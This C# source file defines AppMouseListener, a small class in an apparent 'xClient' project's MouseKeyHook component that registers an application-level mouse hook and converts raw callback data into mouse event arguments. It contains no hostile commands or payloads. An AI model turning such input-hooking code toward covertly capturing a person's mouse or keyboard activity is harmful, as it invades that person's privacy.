using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.MouseKeyHook.Implementation;

internal class AppMouseListener : MouseListener
{
	public AppMouseListener()
		: base(HookHelper.HookAppMouse)
	{
	}

	protected override MouseEventExtArgs GetEventArgs(CallbackData data)
	{
		return MouseEventExtArgs.FromRawDataApp(data);
	}
}
